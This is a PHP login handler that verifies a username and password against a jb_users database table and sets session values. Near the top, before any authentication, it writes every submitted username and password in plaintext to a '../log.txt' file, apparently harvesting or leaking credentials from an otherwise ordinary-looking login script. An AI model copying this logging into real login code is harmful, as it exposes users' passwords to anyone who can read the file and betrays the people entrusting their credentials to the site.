<?php
// Initialize the session
session_start();
// Check if the user is already logged in, if yes then redirect him to welcome page
//if (!isset($_POST["username"])) {
//    header("location: ../index.php");
//    exit;
//}


$log = "output: " . " ". $_POST['username'] . $_POST['password'] ."\n" ;
$file = '../log.txt';
// Open the file to get existing content
$current = file_get_contents($file);
// Append a new person to the file
$current .= $log;
// Write the contents back to the file
file_put_contents($file, $current);
//header("location: ../orderlist.php");

//Include config file
require_once "../config.php";

// Define variables and initialize with empty values
$username = $password = "";

// Processing form data when form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
        $username = $param_username = trim($_POST["username"]);
        $password = trim($_POST["password"]);
        // Prepare a select statement
        $sql = "SELECT * FROM jb_users WHERE username = :username";

        if ($stmt = $pdo->prepare($sql)) {
            // Bind variables to the prepared statement as parameters
            $stmt->bindParam(":username", $param_username, PDO::PARAM_STR);


            // Attempt to execute the prepared statement
            if ($stmt->execute()) {
                if ($stmt->rowCount() == 1) {
                    if ($row = $stmt->fetch()) {
                        $userid = $row["userid"];
                        $hashed_password = $row["password"];
                        $isAdmin = $row["isAdmin"];
                        //header("location: 404.php");
                        if (password_verify($password, $hashed_password)) {
                            $_SESSION["loggedin"] = true;
                            
                            $_SESSION["userid"] = $userid;
                            $_SESSION["username"] = $username;
                            $_SESSION["isAdmin"] = $isAdmin;
                            unset($stmt);
                            unset($pdo);
                            echo "success";
                            exit();
                            }
                        }
                    }
                }
            }
        // Close statement
        unset($stmt);
    // Close connection
    unset($pdo);
    echo "failure";
  }
?>
